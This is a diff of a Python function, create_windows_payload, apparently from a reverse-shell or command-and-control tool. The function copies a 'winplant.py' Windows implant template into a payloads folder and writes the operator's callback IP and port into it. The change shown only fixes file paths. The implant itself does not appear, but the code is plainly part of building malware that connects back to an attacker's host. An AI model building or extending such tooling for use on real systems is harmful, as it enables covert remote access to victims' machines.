@@ -27,19 +27,19 @@ def create_windows_payload(host_ip, host_port):
 
     if os.path.exists(f'{check_cwd}\\shells\\templates\\winplant.py') or os.path.exists(f'{check_cwd}/shells/templates/winplant.py'):
         # copy it to the newly generated file
-        shutil.copy('shells/templates/winplant.py', f'../payloads/{file_name}')
+        shutil.copy('shells/templates/winplant.py', f'payloads/{file_name}')
     else:
         print(bcolors.WARNING + '[-] winplant.py file not found.' + bcolors.ENDC)
 
-    with open(f'../payloads/{file_name}') as f:
+    with open(f'payloads/{file_name}') as f:
         new_host = f.read().replace('INPUT_IP_HERE', host_ip)
-    with open(f'../payloads/{file_name}', 'w') as f:
+    with open(f'payloads/{file_name}', 'w') as f:
         f.write(new_host)
         f.close()
 
-    with open(f'../payloads/{file_name}') as f:
+    with open(f'payloads/{file_name}') as f:
         new_port = f.read().replace('INPUT_PORT_HERE', host_port)
-    with open(f'../payloads/{file_name}', 'w') as f:
+    with open(f'payloads/{file_name}', 'w') as f:
         f.write(new_port)
         f.close()
 
